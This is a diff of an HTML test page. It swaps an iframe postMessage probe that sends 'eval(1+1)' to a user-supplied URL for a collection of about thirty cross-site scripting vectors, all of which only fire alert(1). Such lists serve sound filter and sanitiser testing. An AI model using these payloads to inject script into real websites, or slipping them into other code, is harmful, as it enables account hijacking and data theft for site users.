@@ -1,32 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>test</title>
+<meta charset="UTF-8" />
+<title>XSS Payloads Extended</title>
 </head>
 <body>
-    <script>
-        var src = prompt("Enter the URL of the iframe:");
-        if (src) {
-            var iframe = document.createElement("iframe");
-            iframe.src = src;
-            iframe.width = "600";
-            iframe.height = "400";
-            iframe.id="myFrame";
-            document.body.appendChild(iframe);
+<h1>Extended XSS Payloads - Alert(1)</h1>
 
-            iframe.onload = function () {
-                const message = {
-                    s: "eval(1+1)",
-                    f: "..",
-                    a: []
-                };
-                iframe.contentWindow.postMessage(message, "*");
-            };
-        } else {
-            alert("No URL provided for the iframe.");
-        }
-    </script>
+<button onclick="alert(1)">Click me - onclick</button>
+
+<svg/onload=alert(1)>
+
+<img src=x onerror=alert(1)>
+
+<iframe src="javascript:alert(1)"></iframe>
+
+<body onload=alert(1)>
+
+<input autofocus onfocus=alert(1)>
+
+<a href="javascript:alert(1)">Click me - javascript href</a>
+
+<math><mi xlink:href="javascript:alert(1)"/></math>
+
+<details open ontoggle=alert(1)></details>
+
+<object data="javascript:alert(1)"></object>
+
+<video><source onerror=alert(1)></video>
+
+<marquee onstart=alert(1)></marquee>
+
+<body onpointerdown=alert(1)></body>
+
+<div style="background:url(javascript:alert(1))"></div>
+
+<form action="javascript:alert(1)">
+  <input type="submit" value="Submit form" />
+</form>
+
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+
+<img src=x:alert(1)>
+
+<img dynsrc="javascript:alert(1)">
+
+<img lowsrc="javascript:alert(1)">
+
+<script>alert(1)</script>
+
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+
+<iframe onload="alert(1)" srcdoc="<script>alert(1)</script>"></iframe>
+
+<input type="image" src="javascript:alert(1)">
+
+<body onscroll=alert(1) style="height:2000px">
+
+<div tabindex="0" onfocus=alert(1)>Focus me</div>
+
+<video autoplay loop><source src="javascript:alert(1)"></video>
+
+<img srcset="javascript:alert(1) 1x">
+
+<object type="text/html" data="javascript:alert(1)"></object>
+
+<!-- SVG animation trick -->
+<svg>
+  <animate attributeName="x" from="0" to="1" begin="0s" dur="1s" fill="freeze" onbegin="alert(1)"/>
+</svg>
+
 </body>
 </html>
